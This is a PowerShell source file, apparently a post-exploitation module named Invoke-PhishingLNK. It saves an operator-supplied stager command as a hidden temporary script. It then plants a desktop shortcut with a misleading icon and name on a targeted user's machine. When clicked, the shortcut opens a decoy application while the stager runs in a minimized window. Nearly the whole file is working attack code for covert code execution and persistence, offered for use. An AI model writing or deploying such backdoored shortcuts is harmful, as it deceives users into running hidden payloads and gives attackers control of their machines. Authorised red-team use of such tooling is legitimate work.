function Invoke-PhishingLNK {
    <#
        .SYNOPSIS

            Adds an additional .LNK file to the targeted user's desktop and backdoors it to launch a stager of your choice.
            This lets the operator have the availability to spawn a new agent from the end user clicking a new "useful" shortcut.
            The stager commmand is stored within a temp file that is created within the APPDATA/LOCAL/TEMP/ directory for the targeted user.

            Author: @0xFFaraday
            License: BSD 3-Clause

        .PARAMETER LNKName

            The name you want to make the LNK named. For example, Logout, Backup, Screenshot

        .PARAMETER Application

            The action that you want the user to be "expecting". For Example, C:\windows\System32\calc.exe, C:\windows\System32\SnippingTool.exe

        .PARAMETER TargetedUser

            The user who has the malicious LNK in their Desktop. For example, IEUser

        .PARAMETER Icon

            The icon that is used for the newly created LNK. It is indexed from the SHELL32.DLL File.
            For example, 27 is the logout icon, 32 is a full recycling bin, and 4 is an folder.

            Further icons and their indexes will be in the .LINK section.

        .PARAMETER StagerString

            Copy the command from the powershell / ironpython stager you want to use.

        .EXAMPLE

            Invoke-PhishingLNK -LNKName Backup -TargetedUser IEUser -Application C:\windows\System32\calc.exe -Icon 27 -Stager {Command From Stager}

        .LINK

            Inspired / troubleshooting resources from:
            https://www.ired.team/offensive-security/persistence/modifying-.lnk-shortcuts
            https://www.hull1.com/scriptit/2020/08/15/customize-shortcut-icon.html
    #>

            Param(
            [Parameter(Mandatory = $True)]
            [String]
            $LNKName,

            [Parameter(Mandatory = $True)]
            $TargetedUser,

            [Parameter(Mandatory = $True)]
            $Application,

            [String]
            $Icon = '27',

            [Parameter(Mandatory = $True)]
            [String]
            $StagerCommand
        )

        # Creates Temp file that holds stager command
        $TempStagerFile = New-TemporaryFile
        $TempStagerFullPath = $TempStagerFile.DirectoryName + '\' + $TempStagerFile.Name

        Set-Content -Path $TempStagerFullPath -Value $StagerCommand
        Rename-Item -Path $TempStagerFullPath -NewName "${TempStagerFile}.ps1"

        # Creates new lnk file in targeted user's desktop
        $ShortcutPath = "C:\users\${TargetedUser}\desktop\${LNKName}.lnk"

        # Creates shortcut which contains the valid application and stager command
        $Shell = New-Object -ComObject ("WScript.Shell")
        $Shortcut = $Shell.CreateShortcut($ShortcutPath)

        $Shortcut.Arguments = "-c `"invoke-item ${Application}; powershell.exe ${TempStagerFullPath}.ps1`""
        $Shortcut.TargetPath = "powershell.exe"

        $IconLocation = "C:\windows\System32\SHELL32.dll"
        $IconArrayIndex = $Icon
        $Shortcut.IconLocation = "$IconLocation, $IconArrayIndex"

        # the number that sets the run type to minimized
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()

}

Invoke-PhishingLNK
